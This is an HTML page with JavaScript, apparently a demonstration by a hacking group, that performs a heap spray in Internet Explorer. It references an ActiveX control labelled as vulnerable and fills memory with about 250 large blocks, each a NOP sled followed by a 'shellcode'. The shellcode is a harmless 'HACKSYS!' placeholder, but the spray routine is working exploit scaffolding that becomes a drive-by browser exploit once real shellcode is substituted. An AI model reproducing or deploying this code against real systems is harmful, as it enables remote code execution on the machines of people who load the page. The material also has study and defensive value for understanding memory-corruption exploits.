<html>
<head>
    <title>Heap Spraying In Action JavaScript</title>
    <object classid='CLSID: C44CBF61-7844-4C4B-BC77-7643FD70848E' id='_vulActiveX'>
    </object>
    <script type="text/javascript" language="javascript">
        //==========================================//
        //      Heap Spraying Using JavaScript      //
        //          HackSys Team – Panthera         //
        //         http://hacksys.vfreaks.com/      //
        //          hacksysteam@hotmail.com         //
        //                                          //
        //      unescape() function requirement     //
        //                                          //
        //                  HA CK SY S!             //
        //                  AH KC YS !S             //
        //              A  H  K  C  Y  S  !  S      //
        //              41 48 4b 43 59 53 21 53     //
        //==========================================//

        //shellcode = "HACKSYS!"
        shellcode = unescape('%u4148%u4b43%u5953%u2153');

        nops = unescape('%u9090%u9090');
        headersize = 20;

        //write the output to Internet Explorer's window
        document.write("<H2>Heap Spraying In Action</H2></br>");

        //create one block with nops
        document.write("Creating one block of memory with <b>NOPS</b>.</br>");
        slackspace = headersize + shellcode.length;
        while (nops.length < slackspace) nops += nops;
        fillblock = nops.substring(0, slackspace);

        //enlarge block with nops, size 0x50000
        document.write("Enlarging the memory with <b>NOPS</b> of size <b>0x5000</b>.</br>");
        block = nops.substring(0, nops.length - slackspace);
        while (block.length + slackspace < 0x50000) block = block + block + fillblock;

        document.write("Spraying <b>NOPS + SHELLCODE</b> <b>250</b> times.</br>");

        //spray 250 times : nops + shellcode
        memory = new Array();
        for (counter = 0; counter < 250; counter++) {
            memory[counter] = block + shellcode;

            //show the status of spray on Status bar
            window.status = "Spraying: " + Math.round(100 * counter / 250) + "% done";
        }

        document.write("Allocated <b>" + (block.length + shellcode.length).toString() + "</b> bytes.<br>");
        document.write("Heap Spraying completed successfully.<br>");
        window.status = "Heap Spraying Done";
        alert("Heap Spraying Done");
    </script>
</head>
<body>
</body>
</html>